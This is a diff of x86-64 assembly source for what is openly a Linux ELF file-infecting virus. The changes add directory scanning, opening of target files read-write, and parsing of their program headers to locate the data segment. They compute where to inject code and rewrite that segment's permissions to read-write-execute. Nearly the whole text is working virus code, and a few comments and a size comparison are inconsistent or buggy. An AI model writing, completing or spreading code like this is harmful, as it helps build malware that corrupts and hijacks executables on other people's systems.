@@ -63,7 +63,7 @@ infect:
 	mov rbp, rsp ; ALIGN RBP TO RSP
 
 	; # RESET THE SEEK POINTER TO START OF FILE
-	mov rdi, r9
+	mov rdi, r9 ; FD STORED IN R9
 	mov rax, 8 ; LSEEK KERNEL CODE
 	mov rsi, 0 ; OFFSET OF OUR CHECKBYTE
 	mov rdx, 0 ; SEEK_SET
@@ -71,12 +71,14 @@ infect:
 	; ###########################################
 
 	; # MAKING SPACE FOR VARIABLES
-	sub rsp, 8 ;	PHDR_START		RBP - 8		QWORD
-	sub rsp, 8 ;	SHDR_START		RBP - 16	QWORD
-	sub rsp, 8 ;	HOST_ENTRY		RBP - 24	QWORD
-	sub rsp, 2 ;	PHNUM			RBP - 26	BYTE
-	sub rsp, 2 ;	SHNUM			RBP - 28	BYTE
-	sub rsp, 4096 ; BUF				RSP
+	sub rsp, 8 ;	PHDR_START				RBP - 8		QWORD
+	sub rsp, 8 ;	SHDR_START				RBP - 16	QWORD
+	sub rsp, 8 ;	HOST_ENTRY				RBP - 24	QWORD
+	sub rsp, 2 ;	PHNUM					RBP - 26	BYTE
+	sub rsp, 2 ;	SHNUM					RBP - 28	BYTE
+	sub rsp, 8 ;	INJECTED_OFFSET			RBP - 36	QWORD
+	sub rsp, 8 ;	INJECTED_ADDRESS		RBP - 44	QWORD
+	sub rsp, 4096 ; BUF						RSP + 0		PAGE_SIZE
 	; ############################
 
 	; # READ AND SAVE HEADER INFO
@@ -108,12 +110,84 @@ infect:
 	; #############################
 	
 	; # PARSE SEGMENTS
-	; int 3 ; # BREAKPOINT FOR DEBUG
+
+	; # LSEEK SYSCALL
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rsi, qword[rbp-8] ; PHDR_START
+	mov rdx, 0 ; SEEK_SET
+	syscall
+
+	; # READ SYSCALL
+	mov rax, 0
+	mov al, byte[rbp-26] ; MOV PHNUM TO RAX
+	mov rcx, 0x38 ; SIZEOF Elf64_Phdr STRUCT
+	mul rcx ; rax = rax * rcx
+	mov rdx, rax ; NUMBER OF CHARACTER TO READ (PHDR STRUCT * NUMBER OF STRUCT)
+	mov rdi, r9 ; FD
+	mov rax, 0 ; READ KERNEL CODE
+	lea rsi, [rsp] ; ADDR BUFFER
+	syscall ; NUMBER OF BYTES READ STORED IN RAX
+
+	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
+	mov r8, 0 ; SETTING OUR COUNTER TO 8
+	cmp r10, 0x38 ; CHECK IF WE HAVE READ MORE THAN 1 HEADER STRUCT
+	jl _infectEnd ; IF READ BYTES < SIZEOF PHDRSTRUCT, WEIRD FILE, END PARSING
+_segloop:
+	cmp byte[rsp+r8], 0x1 ; CHECK Phdr->p_type, must be == 1
+	jne _segIterate
+	cmp byte[rsp+r8+4], 0x6 ; CHECK Phdr->p_flags, must be == 6
+	jne _segIterate
+	; # FOUND DATA SEGMENT
+
+	; # CALCULATE INJECTED_OFFSET
+	mov rax, qword[rsp+r8+8]
+	mov qword[rbp-36], rax ; SAVE Phdr->p_offset
+	mov rax, qword[rsp+r8+8+8+8+8] ; MOV Phdr->p_filesz for calculation
+	add qword[rbp-36], rax ; injected_offset = Phdr->p_offset + Phdr->p_filesz;
+
+	; # CALCULATE INJECTED_ADDRESS
+	mov rax, qword[rsp+r8+16]
+	mov qword[rbp-44], rax ; SAVE Phdr->p_vaddr
+	mov rax, qword[rsp+r8+8+8+8+8+8] ; MOV Phdr->p_memsz for calculation
+	add qword[rbp-44], rax ; injected_address = Phdr->p_vaddr + Phdr->p_memsz;
+
+	; # SET EXECUTE FLAG FOR DATA SEG
+	; # LSEEK SYSCALL
+	; # CALCULATE FLAG_OFFSET
+	mov rsi, qword[rbp-8] ; PHDR_START
+	add rsi, r8 ; ADD TO PHDR_START OUR CURRENT STRUCT
+	add rsi, 0x04 ; ADD 0x4 TO GET FLAG OFFSET Phdr->p_flags
+
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rdx, 0 ; SEEK_SET
+	syscall
+	; # WRITE SYSCALL
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	push 0x00000007 ; RWE FLAG VALUE
+	lea rsi, [rsp]
+	mov rdx, 4 ; sizeof(uint32_t)
+	syscall
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+
+	mov rax,rax ; # FOR DEBUG, REMOVE AFTER
+	; int 3
+
+	; # CALCULATE INJECTED_ADDRESS
+
+_segIterate:
+	add r8, 0x38 ; GO TO NEXT PHDR_STRUCT
+	cmp r8, r10 ; CHECK IF WE GO FURTHER THAN ALLOWED BYTES
+	jl _segloop
+	; int 3 ; BREAKPOINT FOR DEBUG
 
 	; ################
 
-	call set_mark ; LET OUR INFECTED MARK
+	; call set_mark ; LET OUR INFECTED MARK
 
+_infectEnd:
 	; # EPILOGUE
 	; # STACK
 	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
@@ -170,11 +244,11 @@ open_file:
 	mov rsi, 2 ; O_RDWR
 	cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
 							  ; CHECKING FOR BEGINNING "targ" IN FILENAME
-	jne _prologue ; IF NOT "target" FILE, SKIP
+	jne _openEnd ; IF NOT "target" FILE, SKIP
 	syscall
 	; # ANALYSE FILE
 	cmp rax, 0 ; CHECK IF FD > 0
-	jb _prologue ; IF < 0 RET
+	jb _openEnd ; IF < 0 RET
 	push rax
 	mov r9, rax ; KEEP OUR FD IN R9 REG
 	call analyse
@@ -185,7 +259,7 @@ open_file:
 	mov rax, 3
 	syscall
 
-_prologue: ; # FOR TESTING ON TARGET, CONDITIONAL JUMP
+_openEnd:
 	; # EPILOGUE
 	; # STACK
 	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
@@ -215,13 +289,15 @@ search:
 				  ; LS getdents64: getdents64(3, /* 9 entries */, 32768)
 				  ; BUFFER SIZE: 32768
 	mov rsi, rsp ; *DIRP BUFFER ADDRESS
-	mov edx, 4096 ; SPECIFY THE SIZE OF OUR BUFFER TO OPENAT
+	mov edx, 4096 ; SPECIFY THE SIZE OF OUR BUFFER TO GETDENTS
 	syscall ; RETURNS NUMBER OF BYTES READ
 	; # CLOSE OPENAT FD
 	push rax ; BACKUP GETDENTS RET
 	mov rax, 3 ; CLOSE KERNEL CODE
 	syscall
 	pop rax ; GET BACK OUR RAX VALUE
+	cmp rax, 0 ; CHECK GETDENTS RET VALUE
+	jle _parseEnd ; GO TO END IF <= 0
 	; # GO PARSE OUR RET STRUCTS
 	; START OF STRUCT STACK
 	mov rdi, rsp ; THE START OF OUR RET STRUCT STORED IN RDI
